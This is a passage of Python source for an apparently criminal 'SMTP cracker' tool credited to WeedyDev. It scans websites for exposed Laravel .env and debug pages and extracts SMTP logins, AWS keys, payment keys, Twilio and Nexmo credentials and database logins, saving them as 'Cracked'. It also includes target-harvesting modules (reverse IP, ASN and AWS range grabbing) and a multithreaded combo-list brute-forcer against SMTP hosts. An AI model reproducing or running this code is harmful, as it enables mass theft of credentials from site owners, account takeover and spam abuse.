			port = get_param(resp, "\nMAIL_PORT =(.*?)\n")
			username = get_param(resp, "\nMAIL_USER =(.*?)\n")
			password = get_param(resp, "\nMAIL_PASSWORD =(.*?)\n")

			mail_from = "info@WeedyDev.in" if get_param(resp, "\nMAIL_FROM_ADDRESS =(.*?)\n") == '-' else get_param(resp, "\nMAIL_FROM_ADDRESS =(.*?)\n")
			from_name = "WeedyDev" if get_param(resp, "\nMAIL_FROM_NAME =(.*?)\n") == '-' else get_param(resp, "\nMAIL_FROM_NAME =(.*?)\n")

			filter_format = filter_smtp(f"{host}|{port}|{username}|{password}")

			if filter_format:
				check_format = f"+++++++++++++++\nHOST={host}\nPORT={port}\nUSERNAME={username}\nPASSWORD={password}\nMAIL_FROM={mail_from}\nFROM_NAME={from_name}\n+++++++++++++++"
				xSave("Cracked", "SMTPS-[CRACKED]", check_format)
				console.print(f'[+] Vuln !!  => {url}', style='green')

		elif "<td>MAIL_SMTP_SERVER = </td>" in resp:
			host = get_param(resp, "<td>MAIL_SMTP_SERVER =<\/td>\s+<td><pre.*>(.*?)<\/span>")
			port = get_param(resp, "<td>MAIL_PORT = <\/td>\s+<td><pre.*>(.*?)<\/span>")
			username = get_param(resp, "<td>MAIL_USER =<\/td>\s+<td><pre.*>(.*?)<\/span>")
			password = get_param(resp, "<td>MAIL_PASSWORD =<\/td>\s+<td><pre.*>(.*?)<\/span>")

			mail_from = "info@WeedyDev.in" if get_param(resp, "\nMAIL_FROM_ADDRESS = (.*?)\n") == '-' else get_param(resp, "\nMAIL_FROM_ADDRESS = (.*?)\n")
			from_name = "WeedyDev" if get_param(resp, "\nMAIL_FROM_NAME = (.*?)\n") == '-' else get_param(resp, "\nMAIL_FROM_NAME = (.*?)\n")

			filter_format = filter_smtp(f"{host}|{port}|{username}|{password}")

			if filter_format:
				check_format = f"+++++++++++++++\nHOST={host}\nPORT={port}\nUSERNAME={username}\nPASSWORD={password}\nMAIL_FROM={mail_from}\nFROM_NAME={from_name}\n+++++++++++++++"
				xSave("Cracked", "SMTPS-[CRACKED]", check_format)
				console.print(f'[+] Vuln !!  => {url}', style='green')

	if "SMTP_USERNAME" in resp:
		if "SMTP_USERNAME=" in resp:
			host = get_param(resp, "\nSMTP_HOST=(.*?)\n")
			port = get_param(resp, "\nSMTP_PORT=(.*?)\n")
			username = get_param(resp, "\nSMTP_USERNAME=(.*?)\n")
			password = get_param(resp, "\nSMTP_PASSWORD=(.*?)\n")

			mail_from = "info@WeedyDev.in" if get_param(resp, "\nSMTP_FROM_ADDRESS=(.*?)\n") == '-' else get_param(resp, "\nSMTP_FROM_ADDRESS=(.*?)\n")
			from_name = "WeedyDev" if get_param(resp, "\nSMTP_FROM_NAME=(.*?)\n") == '-' else get_param(resp, "\nSMTP_FROM_NAME=(.*?)\n")

			filter_format = filter_smtp(f"{host}|{port}|{username}|{password}")

			if filter_format:
				check_format = f"+++++++++++++++\nHOST={host}\nPORT={port}\nUSERNAME={username}\nPASSWORD={password}\nMAIL_FROM={mail_from}\nFROM_NAME={from_name}\n+++++++++++++++"
				xSave("Cracked", "SMTPS-[CRACKED]", check_format)
				console.print(f'[+] Vuln !!  => {url}', style='green')

		elif "<td>SMTP_USERNAME</td>" in resp:
			host = get_param(resp, "<td>SMTP_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>")
			port = get_param(resp, "<td>SMTP_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>")
			username = get_param(resp, "<td>SMTP_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>")
			password = get_param(resp, "<td>SMTP_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>")

			mail_from = "info@WeedyDev.in" if get_param(resp, "\nSMTP_FROM_ADDRESS=(.*?)\n") == '-' else get_param(resp, "\nSMTP_FROM_ADDRESS=(.*?)\n")
			from_name = "WeedyDev" if get_param(resp, "\nSMTP_FROM_NAME=(.*?)\n") == '-' else get_param(resp, "\nSMTP_FROM_NAME=(.*?)\n")

			filter_format = filter_smtp(f"{host}|{port}|{username}|{password}")

			if filter_format:
				check_format = f"+++++++++++++++\nHOST={host}\nPORT={port}\nUSERNAME={username}\nPASSWORD={password}\nMAIL_FROM={mail_from}\nFROM_NAME={from_name}\n+++++++++++++++"
				xSave("Cracked", "SMTPS-[CRACKED]", check_format)
				console.print(f'[+] Vuln !!  => {url}', style='green')

	elif "SMTP_USER" in resp:
		if "SMTP_USER=" in resp:
			host = get_param(resp, "\nSMTP_HOST=(.*?)\n")
			port = get_param(resp, "\nSMTP_PORT=(.*?)\n")
			username = get_param(resp, "\nSMTP_USER=(.*?)\n")
			password = get_param(resp, "\nSMTP_PASS=(.*?)\n")

			mail_from = "info@WeedyDev.in" if get_param(resp, "\nSMTP_FROM_ADDRESS=(.*?)\n") == '-' else get_param(resp, "\nSMTP_FROM_ADDRESS=(.*?)\n")
			from_name = "WeedyDev" if get_param(resp, "\nSMTP_FROM_NAME=(.*?)\n") == '-' else get_param(resp, "\nSMTP_FROM_NAME=(.*?)\n")

			filter_format = filter_smtp(f"{host}|{port}|{username}|{password}")

			if filter_format:
				check_format = f"+++++++++++++++\nHOST={host}\nPORT={port}\nUSERNAME={username}\nPASSWORD={password}\nMAIL_FROM={mail_from}\nFROM_NAME={from_name}\n+++++++++++++++"
				xSave("Cracked", "SMTPS-[CRACKED]", check_format)
				console.print(f'[+] Vuln !!  => {url}', style='green')

		elif "<td>SMTP_USER</td>" in resp:
			host = get_param(resp, "<td>SMTP_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>")
			port = get_param(resp, "<td>SMTP_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>")
			username = get_param(resp, "<td>SMTP_USER<\/td>\s+<td><pre.*>(.*?)<\/span>")
			password = get_param(resp, "<td>SMTP_PASS<\/td>\s+<td><pre.*>(.*?)<\/span>")

			mail_from = "info@WeedyDev.in" if get_param(resp, "\nSMTP_FROM_ADDRESS=(.*?)\n") == '-' else get_param(resp, "\nSMTP_FROM_ADDRESS=(.*?)\n")
			from_name = "WeedyDev" if get_param(resp, "\nSMTP_FROM_NAME=(.*?)\n") == '-' else get_param(resp, "\nSMTP_FROM_NAME=(.*?)\n")

			filter_format = filter_smtp(f"{host}|{port}|{username}|{password}")

			if filter_format:
				check_format = f"+++++++++++++++\nHOST={host}\nPORT={port}\nUSERNAME={username}\nPASSWORD={password}\nMAIL_FROM={mail_from}\nFROM_NAME={from_name}\n+++++++++++++++"
				xSave("Cracked", "SMTPS-[CRACKED]", check_format)
				console.print(f'[+] Vuln !!  => {url}', style='green')

	elif "EMAIL_HOST" in resp:
		if "EMAIL_HOST=" in resp:
			host = get_param(resp, "\nEMAIL_HOST=(.*?)\n")
			port = get_param(resp, "\nSMTP_PORT=(.*?)\n")
			username = get_param(resp, "\nEMAIL_HOST_USER=(.*?)\n")
			password = get_param(resp, "\nEMAIL_HOST_PASSWORD=(.*?)\n")

			mail_from = "info@WeedyDev.in" if get_param(resp, "\nEMAIL_FROM_ADDRESS=(.*?)\n") == '-' else get_param(resp, "\nEMAIL_FROM_ADDRESS=(.*?)\n")
			from_name = "WeedyDev" if get_param(resp, "\nEMAIL_FROM_NAME=(.*?)\n") == '-' else get_param(resp, "\nEMAIL_FROM_NAME=(.*?)\n")

			filter_format = filter_smtp(f"{host}|{port}|{username}|{password}")

			if filter_format:
				check_format = f"+++++++++++++++\nHOST={host}\nPORT={port}\nUSERNAME={username}\nPASSWORD={password}\nMAIL_FROM={mail_from}\nFROM_NAME={from_name}\n+++++++++++++++"
				xSave("Cracked", "SMTPS-[CRACKED]", check_format)
				console.print(f'[+] Vuln !!  => {url}', style='green')

		elif "<td>EMAIL_HOST_USER</td>" in resp:
			host = get_param(resp, "<td>EMAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>")
			port = get_param(resp, "<td>SMTP_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>")
			username = get_param(resp, "<td>EMAIL_HOST_USER<\/td>\s+<td><pre.*>(.*?)<\/span>")
			password = get_param(resp, "<td>EMAIL_HOST_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>")

			mail_from = "info@WeedyDev.in" if get_param(resp, "\nEMAIL_FROM_ADDRESS=(.*?)\n") == '-' else get_param(resp, "\nEMAIL_FROM_ADDRESS=(.*?)\n")
			from_name = "WeedyDev" if get_param(resp, "\nEMAIL_FROM_NAME=(.*?)\n") == '-' else get_param(resp, "\nEMAIL_FROM_NAME=(.*?)\n")

			filter_format = filter_smtp(f"{host}|{port}|{username}|{password}")

			if filter_format:
				check_format = f"+++++++++++++++\nHOST={host}\nPORT={port}\nUSERNAME={username}\nPASSWORD={password}\nMAIL_FROM={mail_from}\nFROM_NAME={from_name}\n+++++++++++++++"
				xSave("Cracked", "SMTPS-[CRACKED]", check_format)
				console.print(f'[+] Vuln !!  => {url}', style='green')

	if "#MAIL_HOST" in resp:
		if "#MAIL_HOST=" in resp:
			host = get_param(resp, "\n#MAIL_HOST=(.*?)\n")
			port = get_param(resp, "\n#MAIL_PORT=(.*?)\n")
			username = get_param(resp, "\n#MAIL_USERNAME=(.*?)\n")
			password = get_param(resp, "\n#MAIL_PASSWORD=(.*?)\n")

			mail_from = "info@WeedyDev.in" if get_param(resp, "\n#MAIL_FROM_ADDRESS=(.*?)\n") == '-' else get_param(resp, "\n#MAIL_FROM_ADDRESS=(.*?)\n")
			from_name = "WeedyDev" if get_param(resp, "\n#MAIL_FROM_NAME=(.*?)\n") == '-' else get_param(resp, "\n#MAIL_FROM_NAME=(.*?)\n")

			filter_format = filter_smtp(f"{host}|{port}|{username}|{password}")

			if filter_format:
				check_format = f"+++++++++++++++\nHOST={host}\nPORT={port}\nUSERNAME={username}\nPASSWORD={password}\nMAIL_FROM={mail_from}\nFROM_NAME={from_name}\n+++++++++++++++"
				xSave("Cracked", "SMTPS-[CRACKED]", check_format)
				console.print(f'[+] Vuln !!  => {url}', style='green')

		elif "<td>#MAIL_HOST</td>" in resp:
			host = get_param(resp, "<td>#MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>")
			port = get_param(resp, "<td>#MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>")
			username = get_param(resp, "<td>#MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>")
			password = get_param(resp, "<td>#MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>")

			mail_from = "info@WeedyDev.in" if get_param(resp, "\n#MAIL_FROM_ADDRESS=(.*?)\n") == '-' else get_param(resp, "\n#MAIL_FROM_ADDRESS=(.*?)\n")
			from_name = "WeedyDev" if get_param(resp, "\n#MAIL_FROM_NAME=(.*?)\n") == '-' else get_param(resp, "\n#MAIL_FROM_NAME=(.*?)\n")

			filter_format = filter_smtp(f"{host}|{port}|{username}|{password}")

			if filter_format:
				check_format = f"+++++++++++++++\nHOST={host}\nPORT={port}\nUSERNAME={username}\nPASSWORD={password}\nMAIL_FROM={mail_from}\nFROM_NAME={from_name}\n+++++++++++++++"
				xSave("Cracked", "SMTPS-[CRACKED]", check_format)
				console.print(f'[+] Vuln !!  => {url}', style='green')

	if "MAILER_DSN=" in resp:
		host = get_param(resp, "\nMAILER_DSN=(.*?)\n")
		if str(host) != "" and  str(host) !="smtp://localhost":
			check_format = f"URL: {url}\nMAILER_DSN: {host}"
			xSave("Cracked", "symfony_mailer_dsn", check_format)
			console.print(f'[+] Vuln !!  => {url}', style='green')

#============== CX ===============#
def worker(url):
	website_url = add_protocol(url)
	try:
		if is_alive(website_url):
			gitcheck(website_url)

			is_hit = None
			response_string = None
			method = ""
			status_code = ""

			if is_hit is None:
				for path in laravel_paths:
					try:
						r = requests.get("".join([website_url, path]), allow_redirects=False,verify=False, timeout=3, headers=Headers)
						#print("".join([website_url, path]))
						result = set(xreg.findall(r.text))
						if len(result) > 0:
							method = path
							response_string = r.text
							status_code = r.status_code
							is_hit = True
							break
					except Exception as e:
						console.print(f'[-] Not Vuln => {url}', style='red')
						continue
			
			if is_hit:
				found_on = website_url + method
				
				if 'APP_NAME' in response_string:
					console.print(f'[+] Vuln  => {found_on}', style='green')
					xSave("Cracked", "!Vuln", found_on)

				get_smtps(response_string, found_on)
				get_aws_data(response_string, found_on)
				get_payment_keys(response_string, found_on)
				get_nexmo(response_string, found_on)
				grab_crypto(response_string, found_on)
				get_twillio(response_string, found_on)
				get_database(response_string, found_on)
			else:
				xSave("Cracked", "Not_Vuln", website_url)
				console.print(f'[-] Not Vuln => {website_url}', style='red')
		else:
			console.print(f"[-] Dead => {website_url}", style="red")
			xSave("Cracked", "Not_Vuln", website_url)

	except Exception as e:
		xSave("Cracked", "ERROR!", website_url)
		pass
#============== MAIN ===============#
def module2():
	module_info = f'''
[magenta]┬────────────────────────────────┬──────────────────────────[/magenta]
[magenta]└╼[/magenta][red1] 1.[/red1] [green]Random IP gen and Checker[/green]  [magenta]└╼[/magenta][red1] 8.[/red1] [green]CIDR Ranger[/green]   
[magenta]└╼[/magenta][red1] 2.[/red1] [green]Grab Domain By Date[/green]        [magenta]└╼[/magenta][red1] 9.[/red1] [green]Reverse IP - SERVER 1[/green]
[magenta]└╼[/magenta][red1] 3.[/red1] [green]Auto Grab Domain[/green]           [magenta]└╼[/magenta][red1] 10.[/red1] [green]Reverse IP - SERVER 2[/green]
[magenta]└╼[/magenta][red1] 4.[/red1] [green]Domain To IP[/green]               [magenta]└╼[/magenta][red1] 11.[/red1] [green]Reverse IP - SERVER 3[/green]
[magenta]└╼[/magenta][red1] 5.[/red1] [green]AWS IP Ranges Grabber[/green]      [magenta]└╼[/magenta][red1] 12.[/red1] [green]AWS ec2 Sites Grabber[/green]
[magenta]└╼[/magenta][red1] 6.[/red1] [green]Grab By ASN[/green]                [magenta]└╼[/magenta][red1] 13.[/red1] [green]Auto Grab IPs Live[/green]
[magenta]└╼[/magenta][red1] 7.[/red1] [green]Grab Country ASN[/green]           [magenta]└╼[/magenta][red1] 14.[/red1] [green]Port 80 http Checker[/green]
[magenta]─────────────────────────────────────────────────────────────[/magenta]

[magenta]┌─[[cyan]SMTP v1.0[/cyan]]─[[red1]~ Input Option To Use ~ [/red1]][/magenta]
	'''
	console.print(module_info)
	Your_Choice = int(Prompt.ask("[magenta]└─╼ ~#[/magenta] "))
	sleep(3)
	if Your_Choice == 1:
		count = int(Prompt.ask("[red1]─╼ Count ~#[/red1] "))
		gen_check(count)

	elif Your_Choice == 2:
		Date = Prompt.ask("\n[red1]─╼ Enter The Date in YYYY-MM-DD Format ~#[/red1] ")
		Limits = int(Prompt.ask("[red1]─╼ Page Limit ~#[/red1] "))
		grab_by_domain1(Date, Limits)

	elif Your_Choice == 3:
		Limits = int(Prompt.ask("[red1]─╼ Enter Page Limit ~#[/red1] "))
		domain_grabber1(Limits)

	elif Your_Choice == 4:
		file_path = Prompt.ask("\n[red1]─╼ Enter Your List ~#[/red1] ")
		lists = codecs.open(file_path, 'r', encoding='utf-8', errors='ignore').read().split('\n')
		Threads = int(Prompt.ask("[red1]─╼ Threads ~#[/red1] "))
		
		with concurrent.futures.ThreadPoolExecutor(max_workers=Threads) as executor:
			results = list(executor.map(domain_to_ip, lists))

	elif Your_Choice == 5:
		console.print("[green] Starting ... [/green]")
		time.sleep(0.5)
		grabber_aws()

	elif Your_Choice == 6:
		asn = Prompt.ask("[red1]─╼ Enter ASN [EX: AS15169] ~#[/red1] ")
		grabber_asn(asn)

	elif Your_Choice == 7:
		country_code = Prompt.ask("[red1]─╼ Enter Country Code [EX: us] ~#[/red1] ")
		ipinfo_db(country_code)

	elif Your_Choice == 8:
		htype = Prompt.ask("\n[red1]─╼ Single/Multiple [EX: 1 For Single IP Range/0 For Multiple Range From File] ~#[/red1] ")

		if htype == '1':
			cidr_range = Prompt.ask("\n[red1]─╼ Enter Cidr Range [EX: 69.16.231.0/24] ~#[/red1] ")

			if is_valid_cidr_range:
				display_array(cidr_ranger(cidr_range))
				save_list_to_file("generated", f"Ranged Cidr - {cidr_range.split('/')[0]}", cidr_ranger(cidr_range))
			else:
				console.print("[red1] Given Cidr Range is Invalid [/red1]")

		else:
			file_path = Prompt.ask("\n[red1]─╼ Enter Your List ~#[/red1] ")
			lists = codecs.open(file_path, 'r', encoding='utf-8', errors='ignore').read().split('\n')
			for lines in lists:
				display_array(cidr_ranger(lines))
				save_list_to_file("generated", f"Ranged Cidr - {Today}", cidr_ranger(lines))

	elif Your_Choice == 9:
		file_path = Prompt.ask("\n[red1]─╼ Enter Your IP List ~#[/red1] ")
		lists = codecs.open(file_path, 'r', encoding='utf-8', errors='ignore').read().split('\n')
		Threads = int(Prompt.ask("[red1]─╼ Threads ~#[/red1] "))
		
		with concurrent.futures.ThreadPoolExecutor(max_workers=Threads) as executor:
			results = list(executor.map(ip_to_domains2, lists))

	elif Your_Choice == 10:
		file_path = Prompt.ask("\n[red1]─╼ Enter Your IP List ~#[/red1] ")
		lists = codecs.open(file_path, 'r', encoding='utf-8', errors='ignore').read().split('\n')
		Threads = int(Prompt.ask("[red1]─╼ Threads ~#[/red1] "))
		
		with concurrent.futures.ThreadPoolExecutor(max_workers=Threads) as executor:
			results = list(executor.map(test_revip, lists))

	elif Your_Choice == 11:
		file_path = Prompt.ask("\n[red1]─╼ Enter Your List ~#[/red1] ")
		lists = codecs.open(file_path, 'r', encoding='utf-8', errors='ignore').read().split('\n')
		Threads = int(Prompt.ask("[red1]─╼ Threads ~#[/red1] "))

		with concurrent.futures.ThreadPoolExecutor(max_workers=Threads) as executor:
			results = list(executor.map(ip_to_domains3, lists))

	elif Your_Choice == 12:
		console.print("[green] Starting ... [/green]")
		time.sleep(0.5)
		grabber_aws_sites()

	elif Your_Choice == 13:
		Limits = int(Prompt.ask("\n[red1]─╼ Enter Page Limit ~#[/red1] "))
		console.print("[green] Starting ... [/green]")
		time.sleep(0.5)
		ips_grabber1(Limits)

	elif Your_Choice == 14:
		file_path = Prompt.ask("\n[red1]─╼ Enter Your List ~#[/red1] ")
		lists = codecs.open(file_path, 'r', encoding='utf-8', errors='ignore').read().split('\n')
		Threads = int(Prompt.ask("[red1]─╼ Threads ~#[/red1] "))

		with concurrent.futures.ThreadPoolExecutor(max_workers=Threads) as executor:
			results = list(executor.map(http_port_scanner, lists))

	else:
		time.sleep(0.5)
		input()
		sys.exit(0)

def module3():
	global xxxHOSTXX, xxxPORTXX
	module_info = '''
[magenta]┬─────────────── [/magenta]
[magenta]└╼[/magenta] [red1]Created By WeedyDev[/red1] [[blue1]TeleGram[/blue1] : [red1]@WeedyDev[/red1]]
[magenta]┬───────────────[/magenta]
[magenta]└╼[/magenta] [gold3]Cracker SMTP From Custom Host with Combos[/gold3]
	'''
	console.print(module_info)
	host = Prompt.ask("\n[red1]─╼ Enter The Host [EX: smtp.office365.com] ~#[/red1] ")
	Port = int(Prompt.ask("[red1]─╼ Enter The Port [EX: 587] ~#[/red1] "))
	ssl = Prompt.ask("[red1]─╼ Do U want Use SSL/TLS Or No y/n ~#[/red1] ")
	#Your_mail = Prompt.ask("[red1]─╼ Enter The Email For Results ~#[/red1] ")
	
	file_path = Prompt.ask("[red1]─╼ Enter Your COMBO List ~#[/red1] ")
	lists = codecs.open(file_path, 'r', encoding="utf-8", errors="ignore").read().split('\n')

	xxxHOSTXX = host
	xxxPORTXX = Port

	if ssl == 'y':
		with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
			results = list(executor.map(smtp_ssl, lists))
	else:
		with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
			results = list(executor.map(smtp_no_ssl, lists))

def ask():
	ascii()
	Information = requests.get("https://pastebin.com/raw/qhGpYayR").text
	console.print(f'''
[magenta]┬─────────────── [/magenta]
[magenta]└╼[/magenta] [red1]Created By WeedyDev[/red1] [[blue1]TeleGram[/blue1] : [red1]@WeedyDev[/red1]]
[magenta]┬───────────────[/magenta]
[magenta]└╼[/magenta] [gold3]Coded in Python[/gold3] [cyan]|[/cyan] [bright_blue]Info[/bright_blue] : [green]{Information}[/green]

[magenta]┬─────── [/magenta][[blue_violet]Settings[/blue_violet]][magenta] ────────[/magenta]
[magenta]└╼ [gold3]Result Email[/gold3] [/magenta]: [[green1]{toaddr}[/green1]]
[magenta]└╼ [gold3]Check Email To SMS[/gold3] [/magenta]: {"[green1]Enabled[/green1]" if CHECK_E2S == 'on' else "[dark_red]Disabled[/dark_red]"}
[magenta]└╼ [gold3]Gateway Phone Number[/gold3][/magenta] :  [cyan]{send_sms_to}[/cyan]
[magenta]└╼ [gold3]Leads Extractor[/gold3] [/magenta]: {"[green1]Enabled[/green1]" if EXTRACTOR == 'on' else "[dark_red]Disabled[/dark_red]"}

[magenta]┬─────── [/magenta][[blue_violet]Toolz[/blue_violet]][magenta] ────────[/magenta]
[magenta]└╼ [red1]1[/red1]. [green]Larvel SMTP Cracker[/green] [/magenta]
[magenta]└╼ [red1]2[/red1]. [green]list generator + grabber[/green] [/magenta]
[magenta]└╼ [red1]3[/red1]. [green]Crack SMTP With Custom SMTP Host[/green] [/magenta]

[magenta]┌─[[cyan]SMTP v1.0[/cyan]]─[[red1]~ Input Menu To Use ~ [/red1]][/magenta]''')
	Your_Choice = int(Prompt.ask("[magenta]└─╼ ~#[/magenta] "))
	sleep(3)

	if Your_Choice == 1:
		ascii()
		file_path = Prompt.ask("\n[red1]─╼ Enter Your List ~#[/red1] ")
		lists = [i.strip() for i in codecs.open(file_path, 'r', encoding='utf-8', errors='ignore').readlines() ]
		Threads = int(Prompt.ask("[red1]─╼ Threads ~#[/red1] "))
		
		with concurrent.futures.ThreadPoolExecutor(max_workers=Threads) as executor:
			results = list(executor.map(worker, lists))

		console.print("\n\n[magenta]~> Process Completed.[/magenta] [red1]Press Enter To Exit ! [/red1]")
		input()

	elif Your_Choice == 2:
		ascii()
		module2()

		console.print("\n\n[magenta]~> Process Completed.[/magenta] [red1]Press Enter To Exit ! [/red1]")
		input()

	elif Your_Choice == 3:
		ascii()
		module3()
		
		console.print("\n\n[magenta]~> Process Completed.[/magenta] [red1]Press Enter To Exit ! [/red1]")
		input()

	else:
		console.print("[red1]~> Invalid Choice. Press Enter To Exit ! [/red1]")
		input()

if __name__ == '__main__':
	ask()